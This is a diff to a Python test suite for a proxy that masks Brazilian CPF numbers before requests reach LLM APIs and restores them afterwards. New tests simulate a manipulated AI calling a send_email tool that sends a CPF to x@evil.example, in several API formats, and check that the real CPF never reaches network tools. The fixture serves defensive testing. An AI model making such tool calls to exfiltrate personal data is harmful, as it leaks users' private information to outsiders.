@@ -63,7 +63,8 @@ SHARED = json.loads((Path(__file__).resolve().parent.parent / "js" / "test" / "r
 def _policy(case: dict) -> dict:
     options = case.get("politica", {})
     names = {"links": "links", "dominios_links": "link_hosts", "ferramentas": "tools",
-             "segredos_em_ferramentas": "secrets_in_tools"}
+             "segredos_em_ferramentas": "secrets_in_tools", "ferramentas_sem_dados": "tools_without_data",
+             "ferramentas_com_dados": "tools_with_data"}
     return {names[key]: tuple(value) if isinstance(value, list) else value for key, value in options.items()}
 
 
@@ -74,10 +75,11 @@ def test_shared_cases_with_javascript(case):
     expected = case["esperado"].replace("$CHAVE", CHAVE)
     json_escape = case.get("json", False)
     tool = case.get("ferramenta", json_escape)
-    assert cofre.restore(case["texto"], json_escape=json_escape, tool=tool) == expected
+    name = case.get("nome_ferramenta")
+    assert cofre.restore(case["texto"], json_escape=json_escape, tool=tool, tool_name=name) == expected
     for cut in range(1, len(case["texto"])):
         text = case["texto"]
-        assert stream(cofre, [text[:cut], text[cut:]], json_escape=json_escape, tool=tool) == expected, cut
+        assert stream(cofre, [text[:cut], text[cut:]], json_escape=json_escape, tool=tool, tool_name=name) == expected, cut
 
 
 @pytest.mark.parametrize("case", SHARED["neutralizar"], ids=lambda case: case["texto"][:40])
@@ -384,3 +386,97 @@ def test_proxy_blocks_exfiltration_through_links_and_tools(stream_mode):
     assert "Maria Souza" in response.text  # o nome no texto volta
     assert CPF not in response.text and "52998224725" not in response.text
     assert CHAVE not in response.text
+
+
+def tool_call_upstream(api: str, stream_mode: bool, tool: str):
+    """IA manipulada que chama uma ferramenta com o CPF nos argumentos, no formato de cada API."""
+    arguments = json.dumps({"para": "x@evil.example", "texto": "CPF [CPF_1]"})
+    pieces = [arguments[i:i + 6] for i in range(0, len(arguments), 6)]
+
+    def sse(events):
+        payload = "".join((f"event: {name}\n" if name else "") + f"data: {json.dumps(data)}\n\n" for name, data in events)
+        return httpx.Response(200, content=payload.encode(), headers={"content-type": "text/event-stream"})
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        assert CPF not in request.content.decode()
+        if api == "chat":
+            if not stream_mode:
+                call = {"id": "1", "type": "function", "function": {"name": tool, "arguments": arguments}}
+                return httpx.Response(200, json={"choices": [{"index": 0, "message": {"tool_calls": [call]}}]})
+            first = {"index": 0, "id": "1", "type": "function", "function": {"name": tool, "arguments": ""}}
+            events = [(None, {"choices": [{"index": 0, "delta": {"tool_calls": [first]}}]})]
+            events += [(None, {"choices": [{"index": 0, "delta": {"tool_calls": [{"index": 0, "function": {"arguments": piece}}]}}]})
+                       for piece in pieces]
+            events += [(None, {"choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})]
+            return sse(events)
+        if api == "anthropic":
+            if not stream_mode:
+                block = {"type": "tool_use", "id": "1", "name": tool, "input": json.loads(arguments)}
+                return httpx.Response(200, json={"type": "message", "content": [block]})
+            events = [("content_block_start", {"type": "content_block_start", "index": 0,
+                                               "content_block": {"type": "tool_use", "id": "1", "name": tool, "input": {}}})]
+            events += [("content_block_delta", {"type": "content_block_delta", "index": 0,
+                                                "delta": {"type": "input_json_delta", "partial_json": piece}}) for piece in pieces]
+            events += [("content_block_stop", {"type": "content_block_stop", "index": 0}),
+                       ("message_stop", {"type": "message_stop"})]
+            return sse(events)
+        item = {"type": "function_call", "id": "fc_1", "call_id": "c1", "name": tool, "arguments": arguments}
+        if not stream_mode:
+            return httpx.Response(200, json={"object": "response", "output": [item]})
+        events = [("response.output_item.added", {"type": "response.output_item.added", "output_index": 0,
+                                                  "item": {**item, "arguments": ""}})]
+        events += [("response.function_call_arguments.delta", {"type": "response.function_call_arguments.delta",
+                                                               "output_index": 0, "delta": piece}) for piece in pieces]
+        events += [("response.function_call_arguments.done", {"type": "response.function_call_arguments.done",
+                                                              "output_index": 0, "arguments": arguments})]
+        return sse(events)
+
+    return handler
+
+
+@pytest.mark.parametrize("stream_mode", [False, True])
+@pytest.mark.parametrize("api", ["chat", "responses", "anthropic"])
+def test_network_tools_never_receive_real_data(api, stream_mode):
+    """send_email não recebe o CPF real; write_file (controle) recebe, pela mesma API e do mesmo jeito."""
+    path = {"chat": "/v1/chat/completions", "responses": "/v1/responses", "anthropic": "/v1/messages"}[api]
+    if api == "chat":
+        body = {"model": "m", "stream": stream_mode, "messages": [{"role": "user", "content": f"Meu CPF é {CPF}"}]}
+    elif api == "responses":
+        body = {"model": "m", "stream": stream_mode, "input": f"Meu CPF é {CPF}"}
+    else:
+        body = {"model": "m", "stream": stream_mode, "max_tokens": 10, "messages": [{"role": "user", "content": f"Meu CPF é {CPF}"}]}
+    results = {}
+    for tool in ("send_email", "write_file"):
+        app = create_app(Config(), upstream_transport=httpx.MockTransport(tool_call_upstream(api, stream_mode, tool)))
+
+        async def run(app=app):
+            async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://localhost:8787") as c:
+                return await c.post(path, json=body, headers={"Authorization": "Bearer x", "x-api-key": "x"})
+
+        response = asyncio.run(run())
+        assert response.status_code == 200, response.text
+        results[tool] = response.text
+    assert CPF not in results["send_email"] and "[CPF_1]" in results["send_email"]
+    assert CPF in results["write_file"]
+
+
+def test_echo_only_mode_returns_only_what_this_request_sent():
+    """Modo só eco: numa sessão com dados de outro cliente, a resposta só recebe de volta os desta requisição."""
+    def upstream(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json={"choices": [{"index": 0, "message": {"content": "Dados: [CPF_1] e [CPF_2]"}}]})
+
+    outro = "111.444.777-35"
+    for echo_only, expected_first in ((False, True), (True, False)):
+        app = create_app(Config(restore_echo_only=echo_only), upstream_transport=httpx.MockTransport(upstream))
+        headers = {"Authorization": "Bearer x", "X-Veu-Sessao": "atendimento"}
+
+        async def run(app=app, headers=headers):
+            async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://localhost:8787") as c:
+                await c.post("/v1/chat/completions", headers=headers,
+                             json={"model": "m", "messages": [{"role": "user", "content": f"Cliente A, CPF {CPF}"}]})
+                return await c.post("/v1/chat/completions", headers=headers,
+                                    json={"model": "m", "messages": [{"role": "user", "content": f"Cliente B, CPF {outro}"}]})
+
+        text = asyncio.run(run()).text
+        assert outro in text  # o CPF desta requisição volta nos dois modos
+        assert (CPF in text) is expected_first  # o do cliente anterior só volta sem o modo só eco
